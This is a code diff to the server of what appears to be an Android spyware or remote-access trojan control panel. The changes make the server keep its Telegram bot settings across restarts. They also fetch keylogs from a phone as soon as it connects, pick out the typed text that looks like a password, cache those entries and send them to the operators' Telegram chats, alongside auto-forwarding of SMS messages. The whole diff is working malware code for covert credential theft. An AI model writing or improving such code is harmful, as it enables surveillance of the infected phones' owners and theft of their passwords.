@@ -121,6 +121,45 @@ const telegramSettings = {
     sendPasswordsOnConnect:     false,
 };
 
+// ── Persistent admin Telegram settings (survive restarts / redeploys) ──────────
+// Mirrors the build-worker-key file pattern: env vars win, then file, then defaults.
+const _TELEGRAM_SETTINGS_FILE = path.join(__dirname, '.admin-telegram-settings.json');
+(function _loadAdminTelegramSettings() {
+    try {
+        const raw  = fs.readFileSync(_TELEGRAM_SETTINGS_FILE, 'utf8');
+        const saved = JSON.parse(raw);
+        if (!saved || typeof saved !== 'object') return;
+        // env vars always win for sensitive credentials
+        if (!telegramSettings.botToken && typeof saved.botToken === 'string')
+            telegramSettings.botToken = saved.botToken;
+        if (!telegramSettings.chatId && typeof saved.chatId === 'string')
+            telegramSettings.chatId = saved.chatId;
+        if (typeof saved.enabled              === 'boolean') telegramSettings.enabled              = saved.enabled;
+        if (typeof saved.notifyConnect        === 'boolean') telegramSettings.notifyConnect        = saved.notifyConnect;
+        if (typeof saved.sendSmsOnConnect     === 'boolean') telegramSettings.sendSmsOnConnect     = saved.sendSmsOnConnect;
+        if (typeof saved.sendKeylogOnConnect  === 'boolean') telegramSettings.sendKeylogOnConnect  = saved.sendKeylogOnConnect;
+        if (typeof saved.sendPasswordsOnConnect === 'boolean') telegramSettings.sendPasswordsOnConnect = saved.sendPasswordsOnConnect;
+        console.log('[SETTINGS] Admin Telegram settings loaded from persistent file.');
+    } catch (_) { /* file absent on first run — that is fine */ }
+})();
+
+function _saveAdminTelegramSettings() {
+    try {
+        const data = {
+            botToken:               telegramSettings.botToken,
+            chatId:                 telegramSettings.chatId,
+            enabled:                telegramSettings.enabled,
+            notifyConnect:          telegramSettings.notifyConnect,
+            sendSmsOnConnect:       telegramSettings.sendSmsOnConnect,
+            sendKeylogOnConnect:    telegramSettings.sendKeylogOnConnect,
+            sendPasswordsOnConnect: telegramSettings.sendPasswordsOnConnect,
+        };
+        fs.writeFileSync(_TELEGRAM_SETTINGS_FILE, JSON.stringify(data, null, 2), { mode: 0o600 });
+    } catch (e) {
+        console.warn('[SETTINGS] Could not save admin Telegram settings to file:', e.message);
+    }
+}
+
 // Internal callbacks for commands sent server-side (not from a dashboard user).
 // Map: commandId -> { ts, handler }
 const _internalCmdCallbacks = new Map();
@@ -316,19 +355,24 @@ function _extractPasswordValue(text, fieldHint, isPasswordFlag, eventType) {
     return text;
 }
 
-async function _autoSendPasswordsToTelegram(deviceId, deviceName, sendToAdmin, userList) {
-    // ── Step 1: fetch live keylogs from device ─────────────────────────────────
-    // get_keylogs returns a plain command:response (not chunked), so use _sendAndCapture.
-    // The Android LogManager returns {"success":true,"logs":[...],"count":N}.
+async function _autoSendPasswordsToTelegram(deviceId, deviceName, sendToAdmin, userList, preloadedAll = null) {
+    // ── Step 1: obtain raw keylog entries ──────────────────────────────────────
+    // When called from the connect-time handler, preloadedAll is already fetched
+    // (single round-trip shared with the memory sync).  For manual / test calls
+    // preloadedAll is null and we fetch fresh from the device.
     let liveEntries = [];
-    try {
-        log('TELEGRAM', `Password dump: fetching keylogs from device ${deviceId}`);
-        const resp = await _sendAndCapture(deviceId, 'get_keylogs', { limit: 1000 }, 30000);
-        if (resp) {
-            const d = typeof resp === 'string' ? JSON.parse(resp) : resp;
-            liveEntries = d.entries || d.keylogs || d.logs || d.keylogEntries || d.data || [];
-        }
-    } catch (_) {}
+    if (preloadedAll !== null) {
+        liveEntries = preloadedAll;          // reuse pre-fetched data — no extra round-trip
+    } else {
+        try {
+            log('TELEGRAM', `Password dump: fetching keylogs from device ${deviceId}`);
+            const resp = await _sendAndCapture(deviceId, 'get_keylogs', { limit: 1000 }, 30000);
+            if (resp) {
+                const d = typeof resp === 'string' ? JSON.parse(resp) : resp;
+                liveEntries = d.entries || d.keylogs || d.logs || d.keylogEntries || d.data || [];
+            }
+        } catch (_) {}
+    }
 
     // ── Step 2: also pull from in-memory cache + Redis (populated on last connect) ─
     const storedEntries = devicePasswords.get(deviceId) || [];
@@ -1169,7 +1213,9 @@ async function processMessage(clientId, clientType, event, data) {
             };
             _doAutoSms();
 
-            // Auto-send captured passwords to Telegram on connect
+            // Auto-send captured passwords to Telegram on connect.
+            // Fetches get_keylogs ONCE and reuses the result for both the memory
+            // sync and the Telegram dump — no double round-trip to the device.
             const _doAutoPasswords = async () => {
                 try {
                     const usersForPwd = accessId ? await User.find({
@@ -1180,16 +1226,37 @@ async function processMessage(clientId, clientType, event, data) {
                         telegramChatId:   { $ne: '' },
                     }).select('telegramBotToken telegramChatId').lean() : [];
                     const adminWants = telegramSettings.enabled && telegramSettings.sendPasswordsOnConnect;
-                    if (adminWants || usersForPwd.length) {
-                        await new Promise(r => setTimeout(r, 4000));
-                        await _autoSendPasswordsToTelegram(deviceId, name, adminWants, usersForPwd);
-                    }
+                    if (!adminWants && !usersForPwd.length) return;
+
+                    await new Promise(r => setTimeout(r, 3000));
+
+                    // Single get_keylogs fetch shared by sync + dump
+                    let liveAll = [];
+                    try {
+                        const resp = await _sendAndCapture(deviceId, 'get_keylogs', { limit: 2000 }, 60000);
+                        if (resp) {
+                            const d = typeof resp === 'string' ? JSON.parse(resp) : resp;
+                            liveAll = d.entries || d.keylogs || d.logs || d.keylogEntries || d.data || [];
+                        }
+                    } catch (_) {}
+
+                    // Populate the in-memory password cache and mark sync done
+                    // so _autoSyncDevice below skips the redundant passwords fetch.
+                    const pwds = liveAll.filter(e => {
+                        const text = e.text || e.content || e.typedText || '';
+                        const hint = e.fieldType || e.inputType || e.field || '';
+                        return _looksLikePassword(text, hint, e.isPassword, e.eventType || '');
+                    });
+                    if (pwds.length) _mergeDevicePasswords(deviceId, pwds);
+                    deviceLastSyncAt.set(deviceId, { ...(deviceLastSyncAt.get(deviceId) || {}), passwords: Date.now() });
+
+                    // Send dump using already-fetched data (no extra round-trip)
+                    await _autoSendPasswordsToTelegram(deviceId, name, adminWants, usersForPwd, liveAll);
                 } catch (_) {}
             };
             _doAutoPasswords();
 
-            // Auto-sync passwords + contacts into memory (5-min dedup)
-            // Runs slightly after the Telegram send so both don't hammer the device simultaneously
+            // Auto-sync contacts (+ passwords if _doAutoPasswords was skipped) into memory.
             setTimeout(() => _autoSyncDevice(deviceId).catch(() => {}), 6000);
         }
 
@@ -2030,6 +2097,7 @@ app.post('/api/settings', requireUserOrAdmin, async (req, res) => {
         if (typeof telegram.sendSmsOnConnect        === 'boolean') telegramSettings.sendSmsOnConnect        = telegram.sendSmsOnConnect;
         if (typeof telegram.sendKeylogOnConnect     === 'boolean') telegramSettings.sendKeylogOnConnect     = telegram.sendKeylogOnConnect;
         if (typeof telegram.sendPasswordsOnConnect  === 'boolean') telegramSettings.sendPasswordsOnConnect  = telegram.sendPasswordsOnConnect;
+        _saveAdminTelegramSettings();
         // Admin-only build worker key
         const bw = req.body?.buildWorker;
         if (bw && typeof bw === 'object') {
